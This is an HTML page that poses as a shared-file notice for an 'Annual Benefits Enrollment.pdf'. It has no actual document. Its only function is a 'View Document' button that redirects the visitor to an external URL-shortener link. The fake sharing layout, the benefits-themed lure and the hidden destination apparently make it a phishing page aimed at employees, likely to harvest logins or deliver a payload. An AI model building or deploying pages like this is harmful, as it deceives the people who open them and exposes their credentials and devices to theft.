<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Annual Benefits Enrollment</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', system-ui, -apple-system, sans-serif;
            background: linear-gradient(180deg, #f8f9fa 0%, #f1f3f5 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: #1f2937;
        }

        .container {
            width: 100%;
            max-width: 480px;
            background: white;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
            overflow: hidden;
            border: 1px solid #e5e7eb;
        }

        .header {
            background: #f8fafc;
            padding: 16px 24px;
            border-bottom: 1px solid #e5e7eb;
            font-size: 14px;
            color: #64748b;
        }

        .shared {
            background: #e0f2fe;
            color: #0369a1;
            padding: 4px 12px;
            border-radius: 9999px;
            font-size: 13px;
            font-weight: 500;
            display: inline-block;
            margin-bottom: 20px;
        }

        .content {
            padding: 32px 28px;
        }

        .title {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 24px;
            color: #0f172a;
        }

        .document-info {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 32px;
        }

        .pdf-icon {
            width: 48px;
            height: 48px;
            background: #dc2626;
            color: white;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 18px;
            margin-right: 12px;
        }

        .access-message {
            background: #f0fdf4;
            border: 1px solid #86efac;
            border-radius: 12px;
            padding: 24px;
            text-align: center;
            margin-bottom: 32px;
        }

        .access-message h3 {
            color: #166534;
            margin-bottom: 8px;
            font-size: 18px;
        }

        .access-message p {
            color: #4b7c3e;
            font-size: 15px;
        }

        .redirect-btn {
            width: 100%;
            background: #1e40af;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            padding: 12px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <span class="shared">Shared with you</span>
        </div>
        <div class="content">
            <h1 class="title">Annual Benefits Enrollment</h1>
            <div class="document-info">
                <div class="pdf-icon">PDF</div>
                <div>
                    <p>Annual Benefits Enrollment.pdf</p>
                    <p>1.2 MB</p>
                </div>
            </div>
            <div class="access-message">
                <h3>Click the button below to view the document.</h3>
                <p>This document contains important information about your benefits.</p>
            </div>
            <button class="redirect-btn" onclick="window.location.href='https://zeck.ink/zwv1a0'">View Document</button>
        </div>
    </div>
</body>
</html>
